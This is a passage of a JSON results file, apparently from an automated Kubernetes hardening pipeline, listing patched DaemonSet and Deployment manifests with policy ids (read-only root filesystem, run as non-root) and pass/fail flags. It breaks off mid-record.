httpGet:\n            path: /healthz\n            port: 8080\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n        env:\n        - name: RELEASE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: OPERATOR_NAME\n          value: olm-operator\n        resources:\n          requests:\n            cpu: 10m\n            memory: 160Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: serving-cert\n        secret:\n          secretName: olm-operator-serving-cert\n",
    "errors": []
  },
  {
    "id": "01270",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01271",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01272",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01273",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01274",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01275",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: csi-secrets-store-windows\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: csi-secrets-store\n  template:\n    metadata:\n      labels:\n        app: csi-secrets-store\n      annotations:\n        kubectl.kubernetes.io/default-container: secrets-store\n    spec:\n      serviceAccountName: secrets-store-csi-driver\n      containers:\n      - name: node-driver-registrar\n        image: k8s.gcr.io/sig-storage/csi-node-driver-registrar:v2.4.0\n        args:\n        - --v=5\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n        livenessProbe:\n          exec:\n            command:\n            - /csi-node-driver-registrar.exe\n            - --kubelet-registration-path=C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\csi.sock\n            - --mode=kubelet-registration-probe\n          initialDelaySeconds: 30\n          timeoutSeconds: 15\n        env:\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: registration-dir\n          mountPath: C:\\registration\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: secrets-store\n        image: k8s.gcr.io/csi-secrets-store/driver:v1.0.0\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --nodeid=$(KUBE_NODE_NAME)\n        - --provider-volume=C:\\k\\secrets-store-csi-providers\n        - --metrics-addr=:8095\n        - --enable-secret-rotation=false\n        - --rotation-poll-interval=2m\n        - --provider-health-check=false\n        - --provider-health-check-interval=2m\n        env:\n        - name: CSI_ENDPOINT\n          value: unix://C:\\\\csi\\\\csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9808\n          name: healthz\n          protocol: TCP\n        - containerPort: 8095\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 15\n        resources:\n          limits:\n            cpu: 400m\n            memory: 400Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        - name: mountpoint-dir\n          mountPath: C:\\var\\lib\\kubelet\\pods\n        - name: providers-dir\n          mountPath: C:\\k\\secrets-store-csi-providers\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.5.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=unix://C:\\csi\\csi.sock\n        - --probe-timeout=3s\n        - --http-endpoint=0.0.0.0:9808\n        - -v=2\n        volumeMounts:\n        - name: plugin-dir\n          mountPath: C:\\csi\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: mountpoint-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\pods\\\n          type: DirectoryOrCreate\n      - name: registration-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins_registry\\\n          type: Directory\n      - name: plugin-dir\n        hostPath:\n          path: C:\\var\\lib\\kubelet\\plugins\\csi-secrets-store\\\n          type: DirectoryOrCreate\n      - name: providers-dir\n        hostPath:\n          path: C:\\k\\secrets-store-csi-providers\\\n          type: DirectoryOrCreate\n",
    "errors": []
  },
  {
    "id": "01276",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
